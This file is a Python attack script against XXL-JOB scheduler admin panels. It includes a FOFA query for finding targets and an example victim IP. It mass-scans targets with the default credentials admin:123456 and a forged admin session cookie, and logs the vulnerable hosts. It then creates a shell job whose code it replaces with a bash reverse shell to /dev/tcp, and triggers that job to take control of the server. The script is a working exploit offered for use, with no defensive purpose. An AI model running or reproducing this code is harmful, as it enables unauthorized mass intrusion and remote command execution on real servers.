#-*- coding:utf-8 -*-
import argparse,sys,base64,requests
import re
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

#fofa：title=”任务调度中心”
#案例：http://34.205.14.218

def banner():
    content = '''
    
██╗  ██╗██╗  ██╗██╗                ██╗ ██████╗ ██████╗ 
╚██╗██╔╝╚██╗██╔╝██║                ██║██╔═══██╗██╔══██╗
 ╚███╔╝  ╚███╔╝ ██║     █████╗     ██║██║   ██║██████╔╝
 ██╔██╗  ██╔██╗ ██║     ╚════╝██   ██║██║   ██║██╔══██╗
██╔╝ ██╗██╔╝ ██╗███████╗      ╚█████╔╝╚██████╔╝██████╔╝
╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝       ╚════╝  ╚═════╝ ╚═════╝ 
                                                  

    '''
    print(content)

def poc(target):
    url = target+ '/login'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Cookie':'XXL_JOB_LOGIN_IDENTITY=7b226964223a312c22757365726e616d65223a2261646d696e222c2270617373776f7264223a226531306164633339343962613539616262653536653035376632306638383365222c22726f6c65223a312c227065726d697373696f6e223a6e756c6c7d; xxljob_adminlte_settings=on'
    }
    data = 'dXNlck5hbWU9YWRtaW4mcGFzc3dvcmQ9MTIzNDU2'
    try:
        res = requests.post(url, data=base64.b64decode(data), headers=headers, verify=False,timeout=5).text
        if '200' in res:
            print(f'[+]{target}存在弱口令，(admin:123456)')
            #exp(target)
            with open('result.txt','a+',encoding='utf-8') as f:
                f.write(target+'\n')
                return True
        else:
            print(f'[-]{target}不存在弱口令')
            return False
    except:
        print(f'[-]{target}无法进入')

def exp(target):
    url  = target + '/jobinfo/add'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
        'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
        'Cookie': 'xxljob_adminlte_settings=on; XXL_JOB_LOGIN_IDENTITY=7b226964223a312c22757365726e616d65223a2261646d696e222c2270617373776f7264223a226531306164633339343962613539616262653536653035376632306638383365222c22726f6c65223a312c227065726d697373696f6e223a6e756c6c7d'
    }
    data = 'jobGroup=1&jobDesc=213&author=123&alarmEmail=&scheduleType=CRON&scheduleConf=*+*+*+*+*+%3F&cronGen_display=*+*+*+*+*+%3F&schedule_conf_CRON=*+*+*+*+*+%3F&schedule_conf_FIX_RATE=&schedule_conf_FIX_DELAY=&glueType=GLUE_SHELL&executorHandler=&executorParam=&executorRouteStrategy=FIRST&childJobId=&misfireStrategy=DO_NOTHING&executorBlockStrategy=SERIAL_EXECUTION&executorTimeout=0&executorFailRetryCount=0&glueRemark=GLUE%E4%BB%A3%E7%A0%81%E5%88%9D%E5%A7%8B%E5%8C%96&glueSource=%23!%2Fbin%2Fbash%0D%0Aecho+%22xxl-job%3A+hello+shell%22%0D%0A%0D%0Aecho+%22%E8%84%9A%E6%9C%AC%E4%BD%8D%E7%BD%AE%EF%BC%9A%240%22%0D%0Aecho+%22%E4%BB%BB%E5%8A%A1%E5%8F%82%E6%95%B0%EF%BC%9A%241%22%0D%0Aecho+%22%E5%88%86%E7%89%87%E5%BA%8F%E5%8F%B7+%3D+%242%22%0D%0Aecho+%22%E5%88%86%E7%89%87%E6%80%BB%E6%95%B0+%3D+%243%22%0D%0A%0D%0Aecho+%22Good+bye!%22%0D%0Aexit+0%0D%0A'
    #jobGroup每个站不一样
    try:
        res = requests.post(url,data=base64.b64decode(data),headers=headers,verify=False,timeout=5).text
        print(res)
        if '200' in res:
            id = re.findall('content":"(.*?)"',res)
            url_shell = target + '/jobcode/save'
            url_trigger = target + '/jobinfo/trigger'
            shell = f'id={id[0]}&glueSource=%23!%2Fbin%2Fbash%0Abash+-i+%3E%26+%2Fdev%2Ftcp%2Fip+0%3E%261&glueRemark=1111'
            trigger = f'id={id[0]}&executorParam=&addressList='
            try:
                res1 = requests.post(url_shell,data=shell,headers=headers,verify=False,timeout=5).text
                if '200' in res1:
                    res2 = requests.post(url_trigger, data=trigger, headers=headers, verify=False, timeout=5).text
                    if '200' in res2:
                        print(f'[+]{target}反弹shell成功')
            except:
                pass
    except:
        pass

def main():
    banner()
    parser = argparse.ArgumentParser(description='XXL-JOB弱口令')
    parser.add_argument('-u','--url',dest='url',type=str,help='example:http://example.com')
    parser.add_argument('-f','--file',dest='file',type=str,help='url.txt')

    args = parser.parse_args()
    if args.url and not args.file:
        if poc(args.url):
            exp(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace('\n',''))
            mp = Pool(100)
            mp.map(poc,url_list)
            mp.close()
            mp.join()
    else:
        print(f'Usage:\n\tpython3 {sys.argv[0]} -h')


if __name__ == '__main__':
    main()
